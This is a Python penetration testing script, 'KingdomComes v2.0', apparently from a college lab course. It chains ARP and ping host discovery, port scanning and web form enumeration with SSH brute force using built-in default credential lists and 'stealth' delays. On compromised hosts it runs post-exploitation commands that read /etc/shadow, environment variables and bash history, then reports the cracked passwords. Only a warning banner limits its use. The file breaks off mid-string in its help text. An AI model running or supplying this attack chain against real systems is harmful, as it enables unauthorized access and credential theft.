#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                         KINGDOMCOMES v2.0                                 ║
║                  Advanced Penetration Testing Framework                   ║
║                                                                           ║
║  Created by: Ilay Malki                                                   ║
║  Institution: HackerU College                                             ║
║  Purpose: Educational Lab Environment Testing                             ║
║                                                                           ║
║  WARNING: For Authorized Testing Only - Illegal Use is Prohibited         ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import argparse
import ipaddress
import os
import platform
import random
import re
import socket
import sys
import warnings
from datetime import datetime
from time import sleep
from urllib.parse import urlparse

import paramiko
import requests
from bs4 import BeautifulSoup
from scapy.all import Ether, ARP, srp, conf  # explicit imports instead of wildcard

# Suppress warnings
warnings.filterwarnings("ignore")
conf.verb = 0  # Suppress scapy output


# ============================================================================
# COLOR SCHEME - Professional Terminal Colors
# ============================================================================
class Colors:
    # Text Colors
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"

    # Styles
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    DIM = "\033[2m"

    # Background
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_BLUE = "\033[44m"

    # Reset
    RESET = "\033[0m"

    # Custom combinations
    SUCCESS = "\033[92m[+]\033[0m"
    ERROR = "\033[91m[-]\033[0m"
    INFO = "\033[94m[*]\033[0m"
    WARNING = "\033[93m[!]\033[0m"
    PROMPT = "\033[96m[>]\033[0m"
    DEBUG = "\033[90m[#]\033[0m"

    @staticmethod
    def disable():
        """
        Disable ANSI color codes for plain-text environments (logs, simple terminals).
        """
        Colors.RED = Colors.GREEN = Colors.YELLOW = Colors.BLUE = ""
        Colors.MAGENTA = Colors.CYAN = Colors.WHITE = Colors.GRAY = ""
        Colors.BOLD = Colors.UNDERLINE = Colors.DIM = ""
        Colors.BG_RED = Colors.BG_GREEN = Colors.BG_BLUE = ""
        Colors.RESET = ""
        Colors.SUCCESS = "[+]"
        Colors.ERROR = "[-]"
        Colors.INFO = "[*]"
        Colors.WARNING = "[!]"
        Colors.PROMPT = "[>]"
        Colors.DEBUG = "[#]"


# ============================================================================
# CONFIGURATION - Customize Your Attack Parameters
# ============================================================================
class Config:
    # Network settings
    TARGET_NETWORK = "192.168.1.0/24"

    # Port lists
    COMMON_PORTS = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
    WEB_PORTS = [80, 443, 8080, 8000, 8443, 8888]
    SSH_PORT = 22

    # Credentials for brute force
    USERNAMES = ["admin", "root", "user", "test", "administrator", "guest", "ubuntu"]
    PASSWORDS = ["admin", "password", "123456", "root", "test", "toor", "", "admin123"]

    # Timing (stealth vs speed)
    SCAN_TIMEOUT = 1
    SSH_TIMEOUT = 10
    MIN_DELAY = 0.2
    MAX_DELAY = 1.0

    # Output
    OUTPUT_FILE = None
    VERBOSE = False
    TEST_CREDS = False  # Quick test mode
    FIND_ALL = False    # --find-all behavior

    # Presentation
    USE_COLORS = True   # Can be disabled with --no-color


# ============================================================================
# VISUAL INTERFACE - Beautiful Terminal Output
# ============================================================================
class Display:
    @staticmethod
    def banner():
        """Display the epic KingdomComes banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ██╗  ██╗██╗███╗   ██╗ ██████╗ ██████╗  ██████╗ ███╗   ███╗
    ██║ ██╔╝██║████╗  ██║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║
    █████╔╝ ██║██╔██╗ ██║██║  ███╗██║  ██║██║   ██║██╔████╔██║
    ██╔═██╗ ██║██║╚██╗██║██║   ██║██║  ██║██║   ██║██║╚██╔╝██║
    ██║  ██╗██║██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
                         ██████╗ ██████╗ ███╗   ███╗███████╗███████╗
                        ██╔════╝██╔═══██╗████╗ ████║██╔════╝██╔════╝
                        ██║     ██║   ██║██╔████╔██║█████╗  ███████╗
                        ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ╚════██║
                        ╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████║
                         ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
{Colors.RESET}
{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════════════════╗
║                  Advanced Penetration Testing Framework                   ║
║                              Version 2.0.0                                ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.MAGENTA}        [👑] Created by: {Colors.BOLD}Ilay Malki{Colors.RESET}{Colors.MAGENTA}
        [🎓] Institution: HackerU College
        [📅] Build Date: {datetime.now().strftime('%B %d, %Y')}
        [⚔️]  "When the kingdom comes, every port shall be tested"
{Colors.RESET}
{Colors.RED}{Colors.BOLD}        ⚠️  WARNING: FOR AUTHORIZED TESTING ONLY ⚠️
        Unauthorized access to computer systems is illegal{Colors.RESET}
"""
        print(banner)

    @staticmethod
    def section_header(title: str):
        """Display a section header"""
        width = 75
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'=' * width}")
        print(f"  {title.upper()}")
        print(f"{'=' * width}{Colors.RESET}\n")

    @staticmethod
    def subsection(title: str):
        """Display a subsection header"""
        print(f"\n{Colors.YELLOW}{'─' * 75}")
        print(f"  {title}")
        print(f"{'─' * 75}{Colors.RESET}\n")

    @staticmethod
    def success(message: str):
        """Success message"""
        print(f"{Colors.SUCCESS} {Colors.GREEN}{message}{Colors.RESET}")

    @staticmethod
    def error(message: str):
        """Error message"""
        print(f"{Colors.ERROR} {Colors.RED}{message}{Colors.RESET}")

    @staticmethod
    def info(message: str):
        """Info message"""
        print(f"{Colors.INFO} {Colors.BLUE}{message}{Colors.RESET}")

    @staticmethod
    def warning(message: str):
        """Warning message"""
        print(f"{Colors.WARNING} {Colors.YELLOW}{message}{Colors.RESET}")

    @staticmethod
    def prompt(message: str):
        """Prompt message"""
        print(f"{Colors.PROMPT} {Colors.CYAN}{message}{Colors.RESET}")

    @staticmethod
    def debug(message: str):
        """Debug message (only shown in verbose mode)"""
        if Config.VERBOSE:
            print(f"{Colors.DEBUG} {Colors.GRAY}{message}{Colors.RESET}")

    @staticmethod
    def target_info(ip: str, description: str = ""):
        """Display target information"""
        print(f"  {Colors.MAGENTA}┌─[{Colors.CYAN}{ip}{Colors.MAGENTA}]{Colors.RESET}")
        if description:
            print(f"  {Colors.MAGENTA}└─>{Colors.RESET} {description}")

    @staticmethod
    def loading_animation(message: str, duration: int = 2):
        """Display loading animation"""
        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        end_time = datetime.now().timestamp() + duration
        i = 0
        while datetime.now().timestamp() < end_time:
            print(
                f"\r{Colors.INFO} {Colors.CYAN}{message} {chars[i % len(chars)]}{Colors.RESET}",
                end="",
                flush=True,
            )
            sleep(0.1)
            i += 1
        print(f"\r{Colors.SUCCESS} {Colors.GREEN}{message} Done!{Colors.RESET}")

    @staticmethod
    def progress_bar(current: int, total: int, prefix: str = "Progress"):
        """Display progress bar"""
        bar_length = 40
        filled = int(bar_length * current / total)
        bar = "█" * filled + "░" * (bar_length - filled)
        percent = int(100 * current / total)
        print(
            f"\r  {Colors.CYAN}{prefix}: [{bar}] {percent}%{Colors.RESET}",
            end="",
            flush=True,
        )
        if current == total:
            print()

    @staticmethod
    def module_start(module_name: str):
        """Display module start message (Metasploit style)"""
        print(
            f"\n{Colors.BLUE}[*]{Colors.RESET} "
            f"{Colors.BOLD}Starting module:{Colors.RESET} "
            f"{Colors.CYAN}{module_name}{Colors.RESET}"
        )


# ============================================================================
# MODULE 1: NETWORK RECONNAISSANCE
# ============================================================================
class NetworkRecon:
    @staticmethod
    def _is_host_alive(ip: str) -> bool:
        """Check if host is alive using ping"""
        param = "-n" if platform.system().lower() == "windows" else "-c"
        command = f"ping {param} 1 -W 1 {ip} > /dev/null 2>&1"
        response = os.system(command)
        return response == 0

    @staticmethod
    def discover_hosts(network_range: str):
        """
        Discover alive hosts using ARP scanning (stealthy Layer 2 detection).
        Falls back to ICMP if privileges are insufficient.
        Handles single IP or network range.
        """
        Display.module_start("NetworkRecon/HostDiscovery")
        Display.subsection("HOST DISCOVERY")
        Display.info(
            f"Target Network: {Colors.BOLD}{network_range}{Colors.RESET}"
        )
        Display.info("Method: ARP Broadcast (Layer 2)")

        alive_hosts = []

        # Check if it's a single IP
        try:
            network = ipaddress.ip_network(network_range, strict=False)
            if network.num_addresses == 1:
                ip = str(network.network_address)
                Display.info(f"Single host target detected: {ip}")
                if NetworkRecon._is_host_alive(ip):
                    alive_hosts = [ip]
                    Display.success(
                        f"Host {Colors.BOLD}{ip}{Colors.RESET} is alive"
                    )
                else:
                    Display.warning(f"Host {ip} is not responding")
                return alive_hosts
        except ValueError:
            Display.error(f"Invalid network range: {network_range}")
            return []

        try:
            # Attempt ARP scan (requires root)
            Display.loading_animation("Broadcasting ARP requests", 1)

            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
            answered, _ = srp(arp_request, timeout=3, verbose=0)

            Display.info(f"Received {len(answered)} ARP responses")

            for _, received in answered:
                ip = received.psrc
                mac = received.hwsrc
                alive_hosts.append(ip)

                Display.target_info(ip, f"MAC: {mac}")

                # Stealthy delay
                sleep(random.random() * Config.MAX_DELAY)

            Display.success(
                f"Discovery complete: {Colors.BOLD}{len(alive_hosts)}{Colors.RESET} hosts alive"
            )
            return alive_hosts

        except PermissionError:
            Display.warning("Insufficient privileges for ARP scan")
            Display.info("Falling back to ICMP ping scan...")
            return NetworkRecon._ping_scan_fallback(network_range)
        except Exception as e:
            Display.error(f"Discovery failed: {e}")
            Display.debug(f"Exception details: {type(e).__name__}")
            return []

    @staticmethod
    def _ping_scan_fallback(network_range: str):
        """Backup ICMP-based host discovery"""
        alive_hosts = []
        try:
            network = ipaddress.ip_network(network_range, strict=False)
            hosts = list(network.hosts())
            total_hosts = len(hosts)
            Display.info(f"Scanning {total_hosts} hosts...")

            for i, host in enumerate(hosts, 1):
                ip = str(host)

                # Silent ping
                param = "-n" if platform.system().lower() == "windows" else "-c"
                command = f"ping {param} 1 -W 1 {ip} > /dev/null 2>&1"
                response = os.system(command)

                if response == 0:
                    alive_hosts.append(ip)
                    Display.success(f"Host alive: {ip}")

                Display.progress_bar(i, total_hosts, "Scanning")
                sleep(random.random() * 0.1)

            print()
            Display.success(
                f"Discovery complete: {len(alive_hosts)} hosts alive"
            )
            return alive_hosts
        except Exception as e:
            Display.error(f"Fallback scan failed: {e}")
            return []


# ============================================================================
# MODULE 2: PORT SCANNING
# ============================================================================
class PortScanner:
    @staticmethod
    def scan_ports(target_ip: str, port_list):
        """
        Perform TCP connect scan on specified ports.
        Uses randomization for stealth.
        """
        Display.module_start("PortScanner/TCPConnect")
        Display.subsection(f"PORT SCANNING: {target_ip}")
        Display.info(f"Scanning {len(port_list)} ports")

        open_ports = {}
        ports_to_scan = random.sample(port_list, len(port_list))  # Randomize order
        total_ports = len(ports_to_scan)

        for idx, port in enumerate(ports_to_scan, 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(Config.SCAN_TIMEOUT)

                result = sock.connect_ex((target_ip, port))

                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except Exception:
                        service = "unknown"

                    open_ports[port] = service
                    Display.success(
                        f"Port {Colors.BOLD}{port}{Colors.RESET} "
                        f"({Colors.CYAN}{service}{Colors.RESET}) is "
                        f"{Colors.GREEN}OPEN{Colors.RESET}"
                    )

                sock.close()

                # Stealth delay
                sleep(
                    random.random()
                    * (Config.MAX_DELAY - Config.MIN_DELAY)
                    + Config.MIN_DELAY
                )

            except Exception as e:
                Display.debug(f"Port {port} scan error: {e}")
                continue

            Display.progress_bar(idx, total_ports, "Port Scan")

        print()

        if open_ports:
            Display.success(
                f"Found {len(open_ports)} open ports on {target_ip}"
            )
        else:
            Display.warning(f"No open ports found on {target_ip}")

        return open_ports


# ============================================================================
# MODULE 3: WEB SERVICE ANALYSIS
# ============================================================================
class WebAnalyzer:
    @staticmethod
    def analyze_web_service(target_ip: str, port: int):
        """
        Enumerate web services and identify login forms.
        """
        Display.module_start("WebAnalyzer/FormEnumeration")
        Display.subsection(f"WEB ENUMERATION: {target_ip}:{port}")

        protocol = "https" if port in [443, 8443] else "http"
        url = f"{protocol}://{target_ip}:{port}"

        Display.info(f"Target URL: {Colors.UNDERLINE}{url}{Colors.RESET}")

        forms_found = []

        try:
            Display.loading_animation("Requesting web page", 1)
            response = requests.get(url, timeout=5, verify=False)

            Display.success(
                f"Response Code: {Colors.BOLD}{response.status_code}{Colors.RESET}"
            )
            Display.info(
                f"Server: {Colors.BOLD}{response.headers.get('Server', 'Unknown')}{Colors.RESET}"
            )
            Display.info(
                f"Content-Length: {Colors.BOLD}{len(response.content)}{Colors.RESET} bytes"
            )

            # Parse HTML
            soup = BeautifulSoup(response.content, "html.parser")

            # Get page title
            title = soup.find("title")
            if title:
                Display.info(
                    f"Page Title: {Colors.BOLD}{title.string[:50]}{Colors.RESET}"
                )

            forms = soup.find_all("form")

            if forms:
                Display.success(f"Discovered {len(forms)} form(s)")

                for idx, form in enumerate(forms, 1):
                    print(f"\n  {Colors.YELLOW}┌─[Form #{idx}]{Colors.RESET}")

                    action = form.get("action", "Not specified")
                    method = form.get("method", "GET").upper()

                    print(
                        f"  {Colors.YELLOW}├─{Colors.RESET} Action: "
                        f"{Colors.CYAN}{action}{Colors.RESET}"
                    )
                    print(
                        f"  {Colors.YELLOW}├─{Colors.RESET} Method: "
                        f"{Colors.MAGENTA}{method}{Colors.RESET}"
                    )

                    # Get input fields
                    inputs = form.find_all("input")
                    print(f"  {Colors.YELLOW}└─{Colors.RESET} Fields:")

                    form_data = {
                        "action": action,
                        "method": method,
                        "inputs": [],
                    }

                    for input_field in inputs:
                        field_name = input_field.get("name", "unnamed")
                        field_type = input_field.get("type", "text")
                        field_value = input_field.get("value", "")

                        form_data["inputs"].append(
                            {
                                "name": field_name,
                                "type": field_type,
                                "value": field_value,
                            }
                        )

                        print(
                            f"     {Colors.CYAN}•{Colors.RESET} "
                            f"{field_name} ({field_type})"
                        )

                    forms_found.append(form_data)

                Display.success("Form enumeration complete")
            else:
                Display.warning("No forms detected on this page")

            return forms_found

        except requests.exceptions.SSLError:
            Display.error("SSL certificate verification failed")
        except requests.exceptions.Timeout:
            Display.error("Connection timeout")
        except Exception as e:
            Display.error(f"Analysis failed: {e}")
            Display.debug(f"Exception type: {type(e).__name__}")

        return []


# ============================================================================
# MODULE 4: SSH BRUTE FORCE
# ============================================================================
class SSHAttack:
    @staticmethod
    def test_single_credential(
        target_ip: str, username: str, password: str, max_retries: int = 5
    ):
        """
        Test a single username/password combination with robust retry logic.
        """
        for retry in range(max_retries):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # Longer timeouts for stability
                ssh.connect(
                    target_ip,
                    port=Config.SSH_PORT,
                    username=username,
                    password=password,
                    timeout=15,          # Increased from 10
                    allow_agent=False,
                    look_for_keys=False,
                    banner_timeout=120,  # Increased from 60
                    auth_timeout=120,    # Increased from 60
                )

                # SUCCESS!
                ssh.close()
                return True, None

            except paramiko.AuthenticationException:
                # Wrong credentials - no need to retry
                return False, "auth_failed"

            except (paramiko.SSHException, EOFError) as e:
                error_msg = str(e)
                if (
                    "Error reading SSH protocol banner" in error_msg
                    or "EOF" in error_msg
                ):
                    # Server is overwhelmed or connection dropped
                    if retry < max_retries - 1:
                        backoff = (retry + 1) * 10  # 10s, 20s, 30s...
                        Display.debug(
                            f"Banner/EOF error on retry "
                            f"{retry + 1}/{max_retries}, waiting {backoff}s"
                        )
                        sleep(backoff)
                        continue
                    else:
                        return False, "banner_error"
                else:
                    # Other SSH error
                    if retry < max_retries - 1:
                        sleep(5)
                        continue
                    return False, f"ssh_error: {error_msg}"

            except socket.error as e:
                # Network/connection error
                if retry < max_retries - 1:
                    sleep(10)
                    continue
                return False, f"socket_error: {e}"

            except Exception as e:
                # Unexpected error
                Display.debug(f"Unexpected error: {type(e).__name__}: {e}")
                if retry < max_retries - 1:
                    sleep(5)
                    continue
                return False, f"unknown_error: {e}"

        return False, "max_retries_exceeded"

    @staticmethod
    def brute_force_single_user(target_ip: str, username: str, passwords):
        """
        Brute force passwords for a single username.
        Returns (username, password) if found, else None.
        """
        Display.info(
            f"Brute forcing passwords for user "
            f"{Colors.BOLD}{username}{Colors.RESET}"
        )

        # Test mode - only first password
        if Config.TEST_CREDS:
            passwords = passwords[:1]

        current_attempt = 0
        total_attempts = len(passwords)

        for password in passwords:
            current_attempt += 1

            pwd_display = password if password else "'blank'"
            print(
                f"\r  {Colors.INFO} Attempt {current_attempt}/{total_attempts}: "
                f"{Colors.YELLOW}{pwd_display}{Colors.RESET} ",
                end="",
                flush=True,
            )

            success, error = SSHAttack.test_single_credential(
                target_ip, username, password
            )

            if success:
                print("\n")
                Display.success(
                    f"Valid password found for "
                    f"{Colors.BOLD}{username}{Colors.RESET}!"
                )
                print(
                    f"  {Colors.GREEN}└─{Colors.RESET} Password: "
                    f"{Colors.BOLD}{password if password else '(blank)'}{Colors.RESET}"
                )
                return username, password

            # Handle errors
            if error == "auth_failed":
                Display.debug(f"Auth failed with {pwd_display}")

            elif error == "banner_error":
                print("\n")
                Display.warning(
                    "Banner error - server may be rate limiting"
                )
                sleep(20)

            elif "socket_error" in error:
                print("\n")
                Display.error(f"Socket error: {error}")
                sleep(30)

            else:
                Display.debug(f"Error: {error}")

            # Delay between attempts
            sleep(random.randint(5, 15))

        print("\n")
        Display.error(f"No valid password found for {username}")
        return None


# ============================================================================
# MODULE 5: POST-EXPLOITATION
# ============================================================================
class PostExploit:
    @staticmethod
    def execute_commands(target_ip: str, username: str, password: str):
        """
        Execute reconnaissance commands on compromised host.
        Returns dictionary of command outputs for reporting.
        """
        Display.module_start("PostExploit/Reconnaissance")
        Display.subsection(f"POST-EXPLOITATION: {target_ip}")
        Display.info(
            f"Authenticating as {Colors.BOLD}{username}{Colors.RESET}"
        )

        probe_commands = [
            ("whoami", "Current User"),
            ("pwd", "Current Directory"),
            ("hostname", "Hostname"),
            ("uname -a", "System Information"),
            (
                "cat /etc/os-release 2>/dev/null || cat /etc/issue",
                "OS Version",
            ),
            ("ifconfig || ip addr", "Network Interfaces"),
            ("cat /etc/passwd", "User Accounts (Full List)"),
            (
                'sudo -l 2>/dev/null || echo "No sudo access"',
                "Sudo Permissions",
            ),
            (
                'cat /etc/shadow 2>/dev/null || echo "No access to shadow file"',
                "Password Hashes",
            ),
            ("cat /etc/group", "Groups"),
            ("ls -la /home", "Home Directories"),
            (
                'ls -la /root 2>/dev/null || echo "No access to /root"',
                "Root Directory Contents",
            ),
            ("ps aux", "Running Processes (Full)"),
            (
                "netstat -tulpn 2>/dev/null || ss -tulpn",
                "Network Connections",
            ),
            ("w", "Currently Logged In Users"),
            ("last | head -20", "Recent Login History"),
            (
                'cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"',
                "SSH Configuration",
            ),
            (
                "find / -perm -4000 -type f 2>/dev/null | head -20",
                "SUID Binaries",
            ),
            (
                'crontab -l 2>/dev/null || echo "No crontab"',
                "User Crontab",
            ),
            ("cat /etc/crontab 2>/dev/null", "System Crontab"),
            ("env", "Environment Variables"),
            (
                "cat ~/.bash_history 2>/dev/null | tail -50 "
                '|| echo "No bash history"',
                "Bash History (Recent)",
            ),
        ]

        recon_data = {}

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                target_ip, username=username, password=password, timeout=10
            )

            Display.success("SSH session established")

            for command, description in probe_commands:
                print(f"\n  {Colors.YELLOW}┌─[{description}]{Colors.RESET}")
                print(
                    f"  {Colors.YELLOW}├─{Colors.RESET} Command: "
                    f"{Colors.CYAN}{command}{Colors.RESET}"
                )
                print(f"  {Colors.YELLOW}└─{Colors.RESET} Output:")

                stdin, stdout, stderr = ssh.exec_command(command, timeout=30)

                output = stdout.read().decode("utf-8", errors="ignore")
                error = stderr.read().decode("utf-8", errors="ignore")

                recon_data[description] = {
                    "command": command,
                    "output": output,
                    "error": error,
                }

                if output:
                    lines = output.split("\n")[:15]
                    for line in lines:
                        if line.strip():
                            print(f"     {Colors.WHITE}{line}{Colors.RESET}")
                    if len(output.split("\n")) > 15:
                        print(
                            f"     {Colors.GRAY}... "
                            f"({len(output.split('\n')) - 15} more lines "
                            f"in full report){Colors.RESET}"
                        )

                if error and not output:
                    print(
                        f"     {Colors.RED}{error[:200]}{Colors.RESET}"
                    )

                sleep(0.3)

            ssh.close()
            Display.success("Reconnaissance complete - Session terminated")

            return recon_data

        except Exception as e:
            Display.error(f"Post-exploitation failed: {e}")
            Display.debug(f"Exception type: {type(e).__name__}")
            return recon_data


# ============================================================================
# MAIN ORCHESTRATION - The Kingdom's Command Center
# ============================================================================
class KingdomComes:
    def __init__(self):
        self.scan_results = {}
        self.start_time = datetime.now()
        self.report_lines = []

    def run(self):
        """
        Main execution flow - The kingdom's conquest begins.
        """
        # ═══ PHASE 1: RECONNAISSANCE ═══
        Display.section_header("🔍 PHASE 1: NETWORK RECONNAISSANCE")

        # Check if target is a URL
        is_web_target = Config.TARGET_NETWORK.lower().startswith(
            ("http://", "https://")
        )

        if is_web_target:
            parsed = urlparse(Config.TARGET_NETWORK)
            host = parsed.hostname
            port = (
                parsed.port
                if parsed.port
                else (443 if parsed.scheme == "https" else 80)
            )
            alive_hosts = [host]
            Display.info(
                f"Web target detected: {Colors.BOLD}{host}:{port}{Colors.RESET}"
            )
        else:
            alive_hosts = NetworkRecon.discover_hosts(Config.TARGET_NETWORK)

        if not alive_hosts:
            Display.error("No hosts discovered - Aborting operation")
            return

        # ═══ PHASE 2: PORT ENUMERATION ═══
        Display.section_header("🔓 PHASE 2: PORT ENUMERATION")

        for host in alive_hosts:
            if is_web_target:
                # For web targets, directly use the specified port
                try:
                    service = socket.getservbyport(port)
                except Exception:
                    if port == 80:
                        service = "http"
                    elif port == 443:
                        service = "https"
                    else:
                        service = "unknown"
                open_ports = {port: service}
                Display.success(
                    f"Targeting port {Colors.BOLD}{port}{Colors.RESET} "
                    f"({Colors.CYAN}{service}{Colors.RESET})"
                )
            else:
                open_ports = PortScanner.scan_ports(
                    host, Config.COMMON_PORTS
                )

            self.scan_results[host] = {
                "ports": open_ports,
                "forms": [],
                "ssh_creds": [],   # list to store multiple accounts
                "recon_data": {},  # Store command outputs per user
            }

        # ═══ PHASE 3: SERVICE ANALYSIS ═══
        Display.section_header("🌐 PHASE 3: SERVICE ANALYSIS")

        for host, data in self.scan_results.items():
            # Web service enumeration
            for p in data["ports"].keys():
                if p in Config.WEB_PORTS:
                    forms = WebAnalyzer.analyze_web_service(host, p)
                    data["forms"].extend(forms)

            # SSH brute force
            if Config.SSH_PORT in data["ports"] and not is_web_target:
                Display.info(f"SSH service detected on {host}")
                found_creds = []

                for username in Config.USERNAMES:
                    Display.info(
                        f"Brute forcing passwords for user "
                        f"{Colors.BOLD}{username}{Colors.RESET}"
                    )
                    found = SSHAttack.brute_force_single_user(
                        host, username, Config.PASSWORDS
                    )
                    if found:
                        found_creds.append(found)

                        # Perform post-exploitation immediately
                        user, pwd = found
                        recon = PostExploit.execute_commands(host, user, pwd)
                        data["recon_data"][user] = recon

                        if not Config.FIND_ALL:
                            Display.info(
                                "Stopping after first successful account "
                                "(use --find-all to continue)"
                            )
                            break

                data["ssh_creds"] = found_creds

        # ═══ FINAL REPORT ═══
        self.generate_report()

    def generate_report(self):
        """
        Generate final penetration test report.
        """
        Display.section_header("📊 FINAL ASSESSMENT REPORT")

        elapsed = datetime.now() - self.start_time

        # Store report lines for export
        self.report_lines = []

        header = """
╔═══════════════════════════════════════════════════════════════════════════╗
║                         ENGAGEMENT SUMMARY                                ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""
        print(f"{Colors.CYAN}{header}{Colors.RESET}")
        self.report_lines.append(header)

        summary = (
            f"  Operator: Ilay Malki\n"
            f"  Framework: KingdomComes v2.0\n"
            f"  Duration: {elapsed.seconds} seconds\n"
            f"  Hosts Scanned: {len(self.scan_results)}\n"
            f"  Target: {Config.TARGET_NETWORK}\n"
        )
        print(summary)
        self.report_lines.append(summary)

        print(f"\n{Colors.YELLOW}{'─' * 75}{Colors.RESET}\n")
        self.report_lines.append(f"\n{'─' * 75}\n")

        for host, data in self.scan_results.items():
            print(
                f"\n  {Colors.MAGENTA}┌─[Target: {host}]{Colors.RESET}"
            )
            print(
                f"  {Colors.MAGENTA}├─{Colors.RESET} Open Ports: "
                f"{Colors.CYAN}{len(data['ports'])}{Colors.RESET} "
                f"{list(data['ports'].keys())}"
            )
            print(
                f"  {Colors.MAGENTA}├─{Colors.RESET} Web Forms: "
                f"{Colors.CYAN}{len(data['forms'])}{Colors.RESET}"
            )

            self.report_lines.append(f"\n  ┌─[Target: {host}]")
            self.report_lines.append(
                f"  ├─ Open Ports: {len(data['ports'])} "
                f"{list(data['ports'].keys())}"
            )
            self.report_lines.append(
                f"  ├─ Web Forms: {len(data['forms'])}"
            )

            if data["ssh_creds"]:
                print(
                    f"  {Colors.MAGENTA}└─{Colors.RESET} "
                    f"{Colors.GREEN}✓ COMPROMISED{Colors.RESET}"
                )
                self.report_lines.append("  └─ ✓ COMPROMISED")

                for username, password in data["ssh_creds"]:
                    print(
                        f"     {Colors.GREEN}├─{Colors.RESET} User: "
                        f"{Colors.BOLD}{username}{Colors.RESET}"
                    )
                    print(
                        f"     {Colors.GREEN}└─{Colors.RESET} Pass: "
                        f"{Colors.BOLD}{password if password else '(blank)'}"
                        f"{Colors.RESET}"
                    )
                    self.report_lines.append(f"     ├─ User: {username}")
                    self.report_lines.append(
                        f"     └─ Pass: {password if password else '(blank)'}"
                    )

                # Add recon details to report (full output)
                if data["recon_data"]:
                    self.report_lines.append("\n  [Reconnaissance Details]")
                    for user, recon_sections in data["recon_data"].items():
                        self.report_lines.append(f"  User: {user}")
                        for section_name, result in recon_sections.items():
                            self.report_lines.append(f"    [{section_name}]")
                            self.report_lines.append(
                                f"    Command: {result['command']}"
                            )
                            if result.get("output"):
                                self.report_lines.append(result["output"])
                            if result.get("error"):
                                self.report_lines.append("    [stderr]")
                                self.report_lines.append(result["error"])
            else:
                print(
                    f"  {Colors.MAGENTA}└─{Colors.RESET} "
                    f"{Colors.RED}✗ NOT COMPROMISED{Colors.RESET}"
                )
                self.report_lines.append("  └─ ✗ NOT COMPROMISED")

        print(f"\n{Colors.YELLOW}{'─' * 75}{Colors.RESET}\n")
        self.report_lines.append(f"\n{'─' * 75}\n")

        # Statistics
        total_ports = sum(
            len(data["ports"]) for data in self.scan_results.values()
        )
        total_forms = sum(
            len(data["forms"]) for data in self.scan_results.values()
        )
        compromised = sum(
            1 for data in self.scan_results.values() if data["ssh_creds"]
        )

        print(f"  {Colors.BOLD}STATISTICS:{Colors.RESET}")
        print(
            f"    • Total Open Ports: "
            f"{Colors.GREEN}{total_ports}{Colors.RESET}"
        )
        print(
            f"    • Web Forms Found: "
            f"{Colors.CYAN}{total_forms}{Colors.RESET}"
        )
        print(
            f"    • Systems Compromised: "
            f"{Colors.GREEN if compromised > 0 else Colors.RED}"
            f"{compromised}{Colors.RESET}/{len(self.scan_results)}"
        )

        stats = (
            "  STATISTICS:\n"
            f"    • Total Open Ports: {total_ports}\n"
            f"    • Web Forms Found: {total_forms}\n"
            f"    • Systems Compromised: "
            f"{compromised}/{len(self.scan_results)}\n"
        )
        self.report_lines.append(stats)

        footer = """
╔═══════════════════════════════════════════════════════════════════════════╗
║                    PENETRATION TEST COMPLETE                              ║
║                  The kingdom has been thoroughly tested                   ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""
        print(f"\n{Colors.CYAN}{footer}{Colors.RESET}")
        self.report_lines.append(footer)

        Display.success("All modules executed successfully")
        print(
            f"\n  {Colors.MAGENTA}[👑] {Colors.BOLD}Ilay Malki{Colors.RESET}"
            f"{Colors.MAGENTA} - HackerU College{Colors.RESET}"
        )
        print(
            f"  {Colors.CYAN}[⚔️]  'When the kingdom comes, every "
            f"vulnerability shall be found'{Colors.RESET}\n"
        )

        self.report_lines.append("\n[👑] Ilay Malki - HackerU College")
        self.report_lines.append(
            "[⚔️] 'When the kingdom comes, every vulnerability shall be found'\n"
        )


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================
def strip_ansi(text: str) -> str:
    """Remove ANSI color codes from text."""
    ansi_escape = re.compile(
        r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])"
    )
    return ansi_escape.sub("", text)


# ============================================================================
# ENTRY POINT - Let the conquest begin!
# ============================================================================
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(
        description="""
╔═══════════════════════════════════════════════════════════════════════════╗
║                    KingdomComes v2.0 - Penetration Testing Framework      ║
╚═══════════════════════════════════════════════════════════════════════════╝

This framework is designed for educational lab environment testing only.

CAPABILITIES:
  • Network reconnaissance (host discovery via ARP/ICMP)
  • Port scanning on common ports
  • Web service analysis (form enumeration)
  • SSH brute force authentication (sequential processing)
  • Post-exploitation reconnaissance on compromised hosts

USAGE EXAMPLES:
  python kingdomcomes.py
  python kingdomcomes.py -t 192.168.1.0/24
  python kingdomcomes.py -t 192.168.1.5 -u users.txt -w passwords.txt
  python kingdomcomes.py -t http://example.com -o report.txt
